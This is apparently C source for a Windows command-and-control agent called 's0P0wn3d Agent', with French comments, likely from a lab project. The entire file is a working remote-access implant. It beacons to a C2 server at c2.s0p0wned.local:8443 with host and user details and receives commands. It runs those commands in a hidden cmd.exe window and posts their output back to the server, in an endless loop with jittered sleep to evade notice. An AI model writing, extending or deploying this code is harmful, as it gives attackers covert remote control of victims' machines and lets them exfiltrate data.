#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <time.h>

// Configuration
#define C2_SERVER "c2.s0p0wned.local"
#define C2_PORT 8443
#define BEACON_INTERVAL 10  // Secondes entre chaque beacon

/**
 * Extrait la commande du JSON retourné par le serveur
 */
int extract_command(const char *response, char *command_out) {
    const char *start = strstr(response, "\"command\":\"");
    
    if (start == NULL) {
        return 0;
    }
    
    start += 11;
    const char *end = strchr(start, '"');
    
    if (end == NULL) {
        return 0;
    }
    
    int length = end - start;
    strncpy(command_out, start, length);
    command_out[length] = '\0';
    
    return 1;
}

/**
 * Exécute une commande shell et capture sa sortie
 */
void execute_command(const char *cmd, char *output, size_t output_size) {
    SECURITY_ATTRIBUTES sa;
    HANDLE hRead, hWrite;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    DWORD bytes_read;
    char buffer[4096];
    
    printf("[*] Exécution : %s\n", cmd);
    
    output[0] = '\0';
    
    // Créer le pipe
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        strcpy(output, "[ERROR] Failed to create pipe");
        return;
    }
    
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
    
    // Configurer le processus
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.wShowWindow = SW_HIDE;
    
    ZeroMemory(&pi, sizeof(pi));
    
    char cmdline[2048];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);
    
    // Lancer le processus
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        strcpy(output, "[ERROR] Failed to execute command");
        return;
    }
    
    CloseHandle(hWrite);
    
    // Lire la sortie
    size_t total_read = 0;
    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytes_read, NULL) && bytes_read > 0) {
        buffer[bytes_read] = '\0';
        
        if (total_read + bytes_read < output_size - 1) {
            strncat(output, buffer, output_size - total_read - 1);
            total_read += bytes_read;
        } else {
            break;
        }
    }
    
    // Attendre la fin (timeout 30s)
    WaitForSingleObject(pi.hProcess, 30000);
    
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    if (strlen(output) == 0) {
        strcpy(output, "[Command executed - no output]");
    }
    
    printf("[+] Output (%d bytes)\n", (int)strlen(output));
}

/**
 * Envoie le résultat d'une commande au serveur C2
 */
int send_result(const char *agent_id, const char *command, const char *output) {
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
    int success = 0;
    
    printf("[*] Envoi du résultat au serveur...\n");
    
    // Créer le timestamp
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%dT%H:%M:%S", t);
    
    // Construire le JSON
    char json_data[8192];
    int json_pos = 0;
    
    // Début du JSON
    json_pos += snprintf(json_data + json_pos, sizeof(json_data) - json_pos,
                        "{\"agent_id\":\"%s\",\"command\":\"", agent_id);
    
    // Échapper la commande
    for (const char *p = command; *p && json_pos < sizeof(json_data) - 10; p++) {
        if (*p == '"' || *p == '\\') {
            json_data[json_pos++] = '\\';
        }
        json_data[json_pos++] = *p;
    }
    
    json_pos += snprintf(json_data + json_pos, sizeof(json_data) - json_pos,
                        "\",\"output\":\"");
    
    // Échapper l'output
    for (const char *p = output; *p && json_pos < sizeof(json_data) - 10; p++) {
        if (*p == '"' || *p == '\\') {
            json_data[json_pos++] = '\\';
            json_data[json_pos++] = *p;
        } else if (*p == '\n') {
            json_data[json_pos++] = '\\';
            json_data[json_pos++] = 'n';
        } else if (*p == '\r') {
            json_data[json_pos++] = '\\';
            json_data[json_pos++] = 'r';
        } else if (*p == '\t') {
            json_data[json_pos++] = '\\';
            json_data[json_pos++] = 't';
        } else {
            json_data[json_pos++] = *p;
        }
    }
    
    json_pos += snprintf(json_data + json_pos, sizeof(json_data) - json_pos,
                        "\",\"timestamp\":\"%s\"}", timestamp);
    
    json_data[json_pos] = '\0';
    
    // Connexion au serveur
    hInternet = InternetOpenA("MyAgent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) goto cleanup;
    
    hConnect = InternetConnectA(hInternet, C2_SERVER, C2_PORT, NULL, NULL,
                                INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) goto cleanup;
    
    hRequest = HttpOpenRequestA(hConnect, "POST", "/result", NULL, NULL, NULL,
                                INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) goto cleanup;
    
    // Envoyer
    char headers[] = "Content-Type: application/json\r\n";
    if (HttpSendRequestA(hRequest, headers, strlen(headers),
                        json_data, strlen(json_data))) {
        success = 1;
        printf("[+] Résultat envoyé au serveur\n");
    } else {
        printf("[-] Échec de l'envoi du résultat\n");
    }
    
cleanup:
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    
    return success;
}

/**
 * Sleep avec jitter aléatoire
 */
void sleep_with_jitter(int base_seconds) {
    // Générer un jitter entre -30% et +30%
    srand(time(NULL) + GetTickCount());
    
    double jitter_factor = 0.7 + ((double)rand() / RAND_MAX) * 0.6;
    // jitter_factor sera entre 0.7 et 1.3
    
    int sleep_ms = (int)(base_seconds * 1000 * jitter_factor);
    
    // Minimum 1 seconde
    if (sleep_ms < 1000) sleep_ms = 1000;
    
    printf("[*] Sleeping %d seconds (base: %d)\n", sleep_ms / 1000, base_seconds);
    Sleep(sleep_ms);
}

/**
 * Envoie un beacon et traite les commandes reçues
 */
int do_beacon_cycle() {
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
    char response[4096];
    DWORD bytes_read = 0;
    int success = 0;
    
    printf("\n[*] === BEACON CYCLE ===\n");
    
    // 1. Connexion
    hInternet = InternetOpenA("MyAgent/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("[-] InternetOpen failed\n");
        goto cleanup;
    }
    
    hConnect = InternetConnectA(hInternet, C2_SERVER, C2_PORT, NULL, NULL,
                                INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("[-] InternetConnect failed\n");
        goto cleanup;
    }
    
    hRequest = HttpOpenRequestA(hConnect, "POST", "/beacon", NULL, NULL, NULL,
                                INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        printf("[-] HttpOpenRequest failed\n");
        goto cleanup;
    }
    
    // 2. Envoyer le beacon
    char json_data[] = "{\"agent_id\":\"TEST_C\",\"hostname\":\"MY-PC\",\"username\":\"User\",\"os\":\"Windows 10\"}";
    char headers[] = "Content-Type: application/json\r\n";
    
    if (!HttpSendRequestA(hRequest, headers, strlen(headers), json_data, strlen(json_data))) {
        printf("[-] HttpSendRequest failed\n");
        goto cleanup;
    }
    
    // 3. Lire la réponse
    if (!InternetReadFile(hRequest, response, sizeof(response) - 1, &bytes_read)) {
        printf("[-] InternetReadFile failed\n");
        goto cleanup;
    }
    
    response[bytes_read] = '\0';
    printf("[+] Beacon sent, response: %d bytes\n", bytes_read);
    
    // 4. Parser et exécuter les commandes
    char command[256];
    if (extract_command(response, command)) {
        printf("[+] Command: %s\n", command);
        
        // Exécuter
        char result[4096];
        execute_command(command, result, sizeof(result));
        
        // Afficher localement (optionnel)
        printf("[+] Output: %.100s%s\n", result, strlen(result) > 100 ? "..." : "");
        
        // Envoyer le résultat
        send_result("TEST_C", command, result);
    } else {
        printf("[-] No commands\n");
    }
    
    success = 1;
    
cleanup:
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    
    return success;
}

/**
 * Main avec boucle infinie
 */
int main() {
    printf("======================================\n");
    printf("  s0P0wn3d Agent - MVP Final\n");
    printf("======================================\n");
    printf("[*] C2 Server: %s:%d\n", C2_SERVER, C2_PORT);
    printf("[*] Starting beacon loop...\n");
    printf("======================================\n\n");
    
    int failure_count = 0;
    
    // Boucle infinie
    while (1) {
        if (do_beacon_cycle()) {
            // Succès : reset le compteur d'échecs
            failure_count = 0;
        } else {
            // Échec : incrémenter
            failure_count++;
            printf("[!] Beacon failed (%d consecutive failures)\n", failure_count);
            
            // Si trop d'échecs, attendre plus longtemps
            if (failure_count >= 5) {
                printf("[!] Too many failures, sleeping 60 seconds...\n");
                Sleep(60000);
                failure_count = 0;
            }
        }
        
        // Sleep avec jitter
        sleep_with_jitter(BEACON_INTERVAL);
    }
    
    return 0;
}